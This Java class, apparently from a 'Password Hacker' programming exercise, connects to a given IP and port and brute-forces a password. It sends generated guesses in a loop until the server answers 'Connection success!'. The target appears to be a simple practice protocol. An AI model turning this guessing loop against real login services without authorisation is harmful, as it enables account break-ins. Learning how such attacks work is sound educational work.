package br.com.dv.hacker;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;

public class PasswordHacker {

    private final PasswordGenerator passwordGenerator = new PasswordGenerator();

    public void run(String[] args) {
        InputData inputData = validateInputs(args);
        if (inputData == null) {
            return;
        }
        String password = bruteForcePassword(inputData.ipAddress(), inputData.port());
        System.out.println(password);
    }

    private InputData validateInputs(String[] args) {
        if (args.length != 2) {
            System.out.println("Invalid number of arguments. Expected 2, got " + args.length + ".");
            return null;
        }

        String ipAddress = args[0];
        int port = parsePort(args[1]);
        if (port == -1) {
            return null;
        }

        return new InputData(ipAddress, port);
    }

    private int parsePort(String portString) {
        int port;
        try {
            port = Integer.parseInt(portString);
            if (port < 0 || port > 65535) {
                System.out.println("Invalid port number.");
                return -1;
            }
        } catch (NumberFormatException e) {
            System.out.println("Invalid port number.");
            return -1;
        }

        return port;
    }

    private String bruteForcePassword(String ipAddress, int port) {
        String currentPassword = "";
        String response = "";

        try (Socket socket = new Socket(ipAddress, port);
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
            while (!response.contains("Connection success!")) {
                currentPassword = passwordGenerator.generateNextPassword(currentPassword);
                output.writeUTF(currentPassword);
                output.flush();
                response = input.readUTF();
            }
        } catch (Exception e) {
            System.out.println("An error occurred while connecting to the server: " + e.getMessage());
            e.printStackTrace();
        }

        return currentPassword;
    }

}
